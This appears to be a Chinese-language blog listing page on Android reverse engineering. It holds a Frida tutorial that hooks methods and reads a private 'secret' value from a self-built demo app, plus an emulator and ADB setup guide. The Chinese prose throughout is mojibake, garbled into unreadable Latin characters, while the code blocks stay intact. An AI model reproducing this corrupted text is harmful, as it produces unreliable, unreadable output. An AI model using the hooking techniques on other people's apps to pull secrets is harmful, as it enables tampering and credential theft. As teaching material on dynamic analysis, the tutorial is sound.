åŸºæœ¬ä¸Šå°±æ˜¯ register ä¸€å€‹æ–°çš„ hexo tagï¼Œç„¶å¾Œç”¨åˆ°äº† <code>details</code> å’Œ <code>summary</code> é€™å…©å€‹ html5 æ–°çš„ tag<br>
æ”¹çš„æ™‚å€™æœ‰å¹¾å€‹å°åœ°æ–¹è¦æ³¨æ„</p>
<ol>
<li><code>details</code> tag åŸæœ¬å°±æœ‰ä¸€å€‹ç®­é ­ä½†æ˜¯å¾ˆé†œï¼Œåœ¨ <code>summary::-webkit-details-marker</code> è¨­å®š <code>display:none</code> æ‹”æ‰ä»–</li>
<li>icon ç”¨åˆ°äº† <code>font-family: Material Icons</code>ï¼Œè¦åœ¨ <code>head</code> è£¡é¢åŠ å€‹å­—é«”</li>
</ol>
<h2 id="Highlight"><a class="header-anchor" href="#Highlight"></a>Highlight</h2>
<p>å¦ä¸€å€‹æ”¹å‹•æ˜¯ç¨‹å¼ç¢¼å€å¡Šçš„éƒ¨åˆ†ï¼ŒåŸä¾†çš„æœ‰é»å°é†œï¼Œå°±æ”¹äº†å¹¾ä¸‹</p>
<ol>
<li>æ²’æœ‰çµ¦æª”åå°±ä¸è¦é¡¯ç¤ºä¸Šé¢çš„ header</li>
<li>å¯ä»¥æŒ‡å®šèµ·å§‹è¡Œæ•¸ï¼Œä»¥åŠæŒ‡å®šæ¨™è¨˜ç‰¹å®šè¡Œæ•¸ï¼Œå¦‚ä¸‹ç¯„ä¾‹</li>
</ol>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python run.py &gt;3,6</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><figcaption><span>run.py >3,6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">f'test <span class="subst">&#123;math.factorial(<span class="number">5</span>)&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2020/02/22/blog02/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>








    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-02-16T08:35:13.000Z">2020-02-16</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/security/">security</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/security/reverse/">reverse</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    7 minutes read (About 1060 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/02/16/security/reverse/frida/">ã€å®‰å“é€†å‘ã€‘Frida Hook å‹•æ…‹èª¿è©¦</a>
            
        </h1>
        <div class="content">
            <p>ä»Šå¤©æˆ‘å€‘è¦ä¾†ç·´ç¿’ç”¨ frida åœ¨ Android ä¸Šåšå‹•æ…‹èª¿è©¦</p>
<h2 id="é€†ä¹‹å‘¼å¸å£¹ä¹‹å‹-ä¸€èˆ¬å‡½å¼"><a class="header-anchor" href="#é€†ä¹‹å‘¼å¸å£¹ä¹‹å‹-ä¸€èˆ¬å‡½å¼"></a>é€†ä¹‹å‘¼å¸å£¹ä¹‹å‹ - ä¸€èˆ¬å‡½å¼</h2>
<p>å…ˆä¾†å¯«å€‹ç°¡å–®çš„ç¯„ä¾‹ APP<br>
æœ‰ä¸€å€‹æŒ‰æ‰­å’Œä¸€å€‹è¼¸å…¥æ¬„ï¼Œè¼¸å…¥åå­—ä¹‹å¾Œï¼ŒæŒ‰ä¸‹æŒ‰éˆ•ï¼Œå°±æœƒé¡¯ç¤º Hello åŠ ä¸Šä½ è¼¸å…¥çš„åå­—<br>
ä¸æœƒå¯« APP çš„å°æœ‹å‹å¯ä»¥å…ˆå» youtube ä¸Šæ‰¾æ•™å­¸ï¼Œæœ‰ä¸€å¤§å †</p>
<figure class="highlight java"><figcaption><span>MainActivity.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        Button sayButton = findViewById(R.id.sayButton);</span><br><span class="line">        sayButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                EditText somethingEditText = findViewById(R.id.somethingEditText);</span><br><span class="line">                TextView resultTextView = findViewById(R.id.resultTextView);</span><br><span class="line">                String something = somethingEditText.getText().toString();</span><br><span class="line">                resultTextView.setText(say(something));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">say</span> <span class="params">(String something)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello "</span> + something;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p align="center"><img data-src="/images/example-app.png" class=" lazyload"  width="300" title="example app"></p>
<p>python è² è²¬å‘¼å« frida api åšæ³¨å…¥ï¼Œjavascript æ˜¯è¢«æ³¨å…¥é€²å»åšäº‹çš„<br>
æˆ‘å€‘çš„ç›®æ¨™æ˜¯ hook å‡½å¼ <code>say</code>ï¼Œä¸¦åœ¨åŸæœ¬çš„è¼¸å‡ºæ–‡å­—å¾Œé¢åŠ ä¸Š <code>!!!</code></p>
<figure class="highlight python"><figcaption><span>hook.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, payload)</span>:</span></span><br><span class="line">    print(message)</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">"com.example.myapplication"</span>])</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"script.js"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">    script.on(<span class="string">"message"</span>, on_message)</span><br><span class="line">    script.load()</span><br><span class="line"></span><br><span class="line">device.resume(pid)</span><br><span class="line"></span><br><span class="line">input()</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><figcaption><span>script.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    main = Java.use(<span class="string">"com.example.myapplication.MainActivity"</span>)</span><br><span class="line">    main.say.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">something</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">this</span>.say(something)</span><br><span class="line">        <span class="keyword">return</span> ret + <span class="string">'!!!'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p align="center"><img data-src="/images/example-app-hook.png" class=" lazyload"  width="300" title="example app hook"></p>
<h2 id="é€†ä¹‹å‘¼å¸è²³ä¹‹å‹-é‡è¼‰å‡½å¼"><a class="header-anchor" href="#é€†ä¹‹å‘¼å¸è²³ä¹‹å‹-é‡è¼‰å‡½å¼"></a>é€†ä¹‹å‘¼å¸è²³ä¹‹å‹ - é‡è¼‰å‡½å¼</h2>
<p>æ”¹ä¸€ä¸‹ç¯„ä¾‹ APPï¼Œå¤šåŠ ä¸Šä¸€å€‹æ¥å—æ•¸å­—åšè¼¸å…¥çš„ <code>say</code> å‡½å¼<br>
æ¥æ”¶åˆ°æ•¸å­—å¾Œï¼Œå°±è¼¸å‡º Hello åŠ ä¸Šè¼¸å…¥çš„æ•¸å­—çš„å¹³æ–¹</p>
<figure class="highlight java"><figcaption><span>MainActivity.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        Button sayButton = findViewById(R.id.sayButton);</span><br><span class="line">        sayButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                EditText somethingEditText = findViewById(R.id.somethingEditText);</span><br><span class="line">                TextView resultTextView = findViewById(R.id.resultTextView);</span><br><span class="line">                String something = somethingEditText.getText().toString();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Integer number = Integer.parseInt(something);</span><br><span class="line">                    resultTextView.setText(say(number));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                    resultTextView.setText(say(something));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">say</span> <span class="params">(String something)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello "</span> + something;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">say</span> <span class="params">(Integer number)</span> </span>&#123;</span><br><span class="line">        number = number * number;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello "</span> + number.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p align="center"><img data-src="/images/example-app2.png" class=" lazyload"  width="300" title="example app"></p>
<p>å…©å€‹ <code>say</code> éƒ½æ˜¯ä¸€æ¨£çš„åå­—ï¼Œæ‰€ä»¥ hook çš„æ™‚å€™è¦ç”¨ <code>overload</code> å»å€åˆ†ï¼Œ<code>overload</code> åƒæ•¸æ”¾çš„æ˜¯ç›®æ¨™å‡½å¼è¼¸å…¥åƒæ•¸çš„å‹æ…‹<br>
é€™æ¬¡æˆ‘å€‘åœ¨æ–°çš„ <code>say</code> å‡½å¼çš„è¼¸å‡ºæ–‡å­—å¾Œé¢åŠ ä¸Š <code>???</code><br>
<code>hook.py</code> è·Ÿä¸Šä¸€å€‹ä¾‹å­ä¸€æ¨£å°±ä¸å†è²¼ä¸€æ¬¡äº†</p>
<figure class="highlight javascript"><figcaption><span>script.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    main = Java.use(<span class="string">"com.example.myapplication.MainActivity"</span>)</span><br><span class="line">    main.say.overload(<span class="string">"java.lang.String"</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">something</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">this</span>.say(something)</span><br><span class="line">        <span class="keyword">return</span> ret + <span class="string">'!!!'</span></span><br><span class="line">    &#125;</span><br><span class="line">    main.say.overload(<span class="string">"java.lang.Integer"</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">number</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">this</span>.say(number)</span><br><span class="line">        <span class="keyword">return</span> ret + <span class="string">'???'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<img src="/images/example-app2-hook.png" class="" width="300" title="example app hook">
<h2 id="é€†ä¹‹å‘¼å¸åƒä¹‹å‹-éš±è—å‡½å¼"><a class="header-anchor" href="#é€†ä¹‹å‘¼å¸åƒä¹‹å‹-éš±è—å‡½å¼"></a>é€†ä¹‹å‘¼å¸åƒä¹‹å‹ - éš±è—å‡½å¼</h2>
<p>å†æ”¹ä¸€ä¸‹ç¯„ä¾‹ APPï¼Œå¤šåŠ ä¸Šä¸€å€‹è®Šæ•¸ <code>secret</code> å’Œä¸€å€‹å‡½å¼ <code>getSecret</code>ï¼Œåœ¨ <code>onCreate</code> è£¡é¢æœƒçµ¦ <code>secret</code> ä¸€å€‹éš¨æ©Ÿå€¼ï¼Œæˆ‘å€‘çš„ç›®æ¨™å°±æ˜¯æ‰¾å‡ºé€™å€‹å€¼</p>
<figure class="highlight java"><figcaption><span>MainActivity.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> secret;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        secret = (<span class="keyword">int</span>) (Math.random() * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">        Button sayButton = findViewById(R.id.sayButton);</span><br><span class="line">        sayButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                EditText somethingEditText = findViewById(R.id.somethingEditText);</span><br><span class="line">                TextView resultTextView = findViewById(R.id.resultTextView);</span><br><span class="line">                String something = somethingEditText.getText().toString();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Integer number = Integer.parseInt(something);</span><br><span class="line">                    resultTextView.setText(say(number));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                    resultTextView.setText(say(something));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">say</span> <span class="params">(String something)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello "</span> + something;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">say</span> <span class="params">(Integer number)</span> </span>&#123;</span><br><span class="line">        number = number * number;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello "</span> + number.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSecret</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å› ç‚ºæˆ‘å€‘çš„ç›®æ¨™ä¸æ˜¯è‡ªå·± new ä¸€å€‹ç‰©ä»¶å‡ºä¾†æŠ“ <code>secret</code>ï¼Œé€™æ¨£å°±åªæ˜¯ä¸€å€‹æˆ‘å€‘è‡ªå·±å°±å¯ä»¥ç”Ÿæˆçš„éš¨æ©Ÿå€¼è€Œå·²<br>
æˆ‘å€‘æ˜¯è¦æ‰¾å‡ºç›®å‰å·²ç¶“å­˜åœ¨çš„é‚£å€‹ instance çš„ <code>secret</code>ï¼Œåœ¨å¯¦éš›ä¾‹å­ä¸­å¯èƒ½å°±æœƒæ˜¯ä¸€çµ„éš¨æ©Ÿç”Ÿæˆçš„å¯†ç¢¼ä¹‹é¡çš„<br>
æ‰€ä»¥æˆ‘å€‘è¦ç”¨åˆ° <code>Java.choose</code> å»æŠ“ instanceï¼ŒæŠ“åˆ° instance å¾Œï¼Œå¯ä»¥</p>
<ol>
<li><code>instance.getSecret()</code> å‘¼å«å‡½å¼æå®š</li>
<li><code>instance.secret.value</code> å­˜å–è®Šæ•¸æå®š</li>
</ol>
<p>ç„¶å¾Œç”¨ <code>send</code> å¯ä»¥æŠŠè³‡æ–™å‚³åˆ° python ç«¯çš„ <code>on_message</code> åšè™•ç†</p>
<figure class="highlight javascript"><figcaption><span>script.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.choose(<span class="string">"com.example.myapplication.MainActivity"</span>, &#123;</span><br><span class="line">        onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;</span><br><span class="line">            send(instance.getSecret())  <span class="comment">// call function</span></span><br><span class="line">            send(instance.secret.value) <span class="comment">// access vairable</span></span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">    &#125;) </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="ç–‘é›£é›œç—‡"><a class="header-anchor" href="#ç–‘é›£é›œç—‡"></a>ç–‘é›£é›œç—‡</h2>
<p>Q : æœ‰å‡½å¼ <code>a</code> è·Ÿè®Šæ•¸ <code>a</code> åŒåæ€éº¼è¾¦ ?<br>
A : <code>a</code> å­˜å–å‡½å¼ï¼Œ<code>_a</code> å­˜å–è®Šæ•¸</p>
<hr>
<ol>
<li><a href="https://github.com/hookmaster/frida-all-in-one">https://github.com/hookmaster/frida-all-in-one</a></li>
<li><a href="https://github.com/frida/frida/issues/833">How to access class member variable if thereâ€™s a member function called the same name?</a></li>
</ol>

        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2020/02/16/security/reverse/frida/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>








    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-02-15T15:17:50.000Z">2020-02-15</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/security/">security</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/security/reverse/">reverse</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    3 minutes read (About 461 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/02/15/security/reverse/android-emulator/">ã€å®‰å“é€†å‘ã€‘Android Studio Emulator + ADB ç’°å¢ƒä½ˆç½®</a>
            
        </h1>
        <div class="content">
            <p>ç´€éŒ„ä¸€ä¸‹æ€éº¼è¨­å®šå¥½ä¸€å° Android çš„è™›æ“¬æ©Ÿ</p>
<ol>
<li>æˆ‘æ˜¯ç”¨ Android Studio è£¡é¢çš„ Emulatorï¼Œæ‰€ä»¥è¦å…ˆè£ä¸€ä¸‹ <a href="https://developer.android.com/studio">Android Studio</a></li>
<li>æ‰“é–‹ AVD Manager å¾Œé» Create Virtual Device</li>
</ol>
<p align="center"><img data-src="/images/avd-manager.png" class=" lazyload"  title="AVD Manager"></p>
<ol start="3">
<li>é¸ä¸€å€‹ deviceï¼Œæ¯”å¦‚ Pixel 3a</li>
<li>é¸ä¸€å€‹ system imageï¼Œæ¯”å¦‚ Pie</li>
<li>å®Œæˆ</li>
</ol>
<h2 id="ADB-Android-Debug-Bridge"><a class="header-anchor" href="#ADB-Android-Debug-Bridge"></a>ADB ( Android Debug Bridge )</h2>
<h3 id="è·¯å¾‘"><a class="header-anchor" href="#è·¯å¾‘"></a>è·¯å¾‘</h3>
<p>åœ¨ Android SDK çš„ platform-tools è£¡é¢ï¼Œç”¨ macos çš„è©±æ‡‰è©²æœƒåœ¨ <code>/Users/xxx/Library/Android/sdk/platform-tools/</code><br>
æ²’æœ‰çš„è©±å¯ä»¥å» <a href="https://developer.android.com/studio/releases/platform-tools">å®˜ç¶²</a> è¼‰</p>
<h3 id="åŸºæœ¬åŠŸèƒ½"><a class="header-anchor" href="#åŸºæœ¬åŠŸèƒ½"></a>åŸºæœ¬åŠŸèƒ½</h3>
<table>
<thead>
<tr>
<th>æŒ‡ä»¤</th>
<th>è§£é‡‹</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>adb devices</code></td>
<td>åˆ—å‡ºæ‰€æœ‰è£ç½®</td>
</tr>
<tr>
<td><code>adb root</code></td>
<td>ç”¨ root æ¬Šé™é‡é–‹ adb æœå‹™</td>
</tr>
<tr>
<td><code>adb shell</code></td>
<td>äº’å‹•å¼çš„ shell</td>
</tr>
<tr>
<td><code>adb shell &quot;ls&quot;</code></td>
<td>åŸ·è¡Œä¸€è¡ŒæŒ‡ä»¤</td>
</tr>
<tr>
<td><code>adb push ./myfile /data/local/tmp/</code></td>
<td>å‚³æª”æ¡ˆé€²å»</td>
</tr>
<tr>
<td><code>adb pull /data/local/tmp/myfile ./</code></td>
<td>æŠ“æª”æ¡ˆå‡ºä¾†</td>
</tr>
<tr>
<td><code>adb reboot</code></td>
<td>é‡é–‹æ©Ÿï¼Œå¯ä»¥ç°¡å–®ç²—æš´çš„é©—è­‰æœ‰æ²’æœ‰è¨­ç½®æˆåŠŸ</td>
</tr>
</tbody>
</table>
<p>å¦‚æœæœ‰å¤šå°è£ç½®çš„è©±ï¼Œè¦åŠ  <code>-s</code> æŒ‡å®šå“ªä¸€å€‹è£ç½®ï¼Œæ¯”å¦‚ <code>adb -s emulator-5554 shell</code></p>
<h2 id="ç–‘é›£é›œç—‡"><a class="header-anchor" href="#ç–‘é›£é›œç—‡"></a>ç–‘é›£é›œç—‡</h2>
<p>Q : é‡åˆ° <code>adbd cannot run as root in production builds</code> æ€éº¼è¾¦ ?<br>
A : åœ¨é¸ image çš„æ™‚å€™è¦é¸ target æ˜¯ Google APIs çš„</p>
<p>Q : æ€éº¼å¸è¼‰ system image ?<br>
A : æ‰“é–‹ SDK Manager ( åœ¨ AVD Manager æ—é‚Š )ï¼Œå‹¾é¸ Show Package Detailsï¼Œå°±å¯ä»¥çœ‹åˆ°ä¸‹è¼‰éçš„ system imageï¼Œå–æ¶ˆå‹¾é¸å†æŒ‰ OK å°±å¸è¼‰äº†</p>
<p>Q : æ€éº¼å¸è¼‰ app ?<br>
A : é™¤äº†éº»ç“œçš„æ–¹æ³•å¤–ï¼Œä¹Ÿå¯ä»¥åœ¨ <code>adb shell</code> æ‹¿åˆ° shell ä¹‹å¾Œï¼Œç”¨ <code>pm list packages</code> çœ‹æœ‰å“ªäº› appï¼Œå†ç”¨ <code>pm uninstall -k com.example.test_app</code> å¸è¼‰ app</p>
<p>Q : æ€éº¼æŠŠ apk æŠ“å‡ºä¾†?<br>
